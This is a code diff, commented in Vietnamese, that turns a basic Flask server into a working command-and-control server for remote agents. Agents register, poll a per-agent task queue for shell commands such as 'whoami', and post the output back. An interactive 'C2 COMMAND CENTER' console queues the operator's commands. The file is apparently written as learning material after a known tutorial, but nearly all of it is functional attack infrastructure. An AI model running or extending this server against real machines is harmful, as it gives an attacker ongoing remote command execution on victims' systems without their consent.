@@ -2,49 +2,88 @@ from flask import Flask, request
 import random
 import string
 import datetime
+import threading
+import time
+import sys
+
+# Tắt log mặc định của Flask để đỡ rối mắt khi chat
+import logging
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
 
 app = Flask(__name__)
 
-# Database trong bộ nhớ (lưu tạm)
-# Cấu trúc: {'ID_CUA_AGENT': {'ip': '...', 'name': '...', 'last_seen': ...}}
+# Cấu trúc: {'ID': {'name': '...', 'tasks': ['lenh1', 'lenh2'], 'results': []}}
 agents = {}
 
 def generate_id():
-    """Tạo chuỗi ID ngẫu nhiên 6 ký tự"""
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
 
-@app.route('/')
-def index():
-    return "It works!", 200
+# --- API ENDPOINTS ---
 
-# Endpoint 1: Đăng ký (Register)
-# Agent sẽ gọi vào đây đầu tiên để báo danh
 @app.route('/reg', methods=['POST'])
 def register():
-    try:
-        # Lấy tên máy từ dữ liệu gửi lên
-        agent_name = request.form.get('name')
-        agent_ip = request.remote_addr
-        
-        # Tạo ID định danh cho Agent này
-        new_id = generate_id()
-        
-        # Lưu vào danh sách
-        agents[new_id] = {
-            "name": agent_name,
-            "ip": agent_ip,
-            "last_seen": datetime.datetime.now()
-        }
-        
-        print(f"[+] New Agent joined: {agent_name} ({agent_ip}) -> Assigned ID: {new_id}")
-        
-        # Trả ID về cho Agent nhớ
-        return new_id, 200
-    except Exception as e:
-        print(f"[-] Register error: {e}")
-        return "Error", 500
+    agent_name = request.form.get('name')
+    new_id = generate_id()
+    agents[new_id] = {
+        "name": agent_name,
+        "tasks": [],     # Hàng đợi lệnh
+        "results": []
+    }
+    print(f"\n[+] New Agent: {agent_name} -> ID: {new_id}")
+    return new_id, 200
+
+@app.route('/tasks/<agent_id>', methods=['GET'])
+def get_task(agent_id):
+    # Nếu agent tồn tại và có lệnh đang chờ
+    if agent_id in agents and agents[agent_id]['tasks']:
+        # Lấy lệnh đầu tiên ra (First In First Out)
+        task = agents[agent_id]['tasks'].pop(0)
+        return task, 200
+    return '', 204 # 204 No Content (Không có việc gì làm)
+
+@app.route('/results/<agent_id>', methods=['POST'])
+def receive_result(agent_id):
+    if agent_id in agents:
+        output = request.form.get('result')
+        print(f"\n[v] Result from {agents[agent_id]['name']} ({agent_id}):\n{output}")
+        print("C2 > ", end="", flush=True)
+    return '', 200
+
+# --- CLI (Giao diện nhập lệnh) ---
+
+def console_thread():
+    time.sleep(2) # Đợi server start
+    print("\n=== C2 COMMAND CENTER ===")
+    print("Syntax: set <agent_id> <command>")
+    print("Example: set A1B2C3 whoami")
+    
+    while True:
+        try:
+            cmd = input("\nC2 > ")
+            if not cmd: continue
+            
+            parts = cmd.split(' ', 2)
+            if parts[0] == "set" and len(parts) == 3:
+                target_id = parts[1]
+                task = parts[2]
+                
+                if target_id in agents:
+                    agents[target_id]['tasks'].append(task)
+                    print(f"[*] Queued task '{task}' for Agent {target_id}")
+                else:
+                    print(f"[-] Agent ID {target_id} not found!")
+            elif cmd == "list":
+                print(f"Agents: {list(agents.keys())}")
+            else:
+                print("Unknown command. Use: set <id> <cmd> | list")
+        except Exception as e:
+            print(f"Error: {e}")
 
 if __name__ == '__main__':
-    print("[*] C2 Server (0xrick style) listening on port 8080...")
+    # Chạy luồng nhập liệu song song
+    t = threading.Thread(target=console_thread, daemon=True)
+    t.start()
+    
     # Chạy server
     app.run(host='0.0.0.0', port=8080)
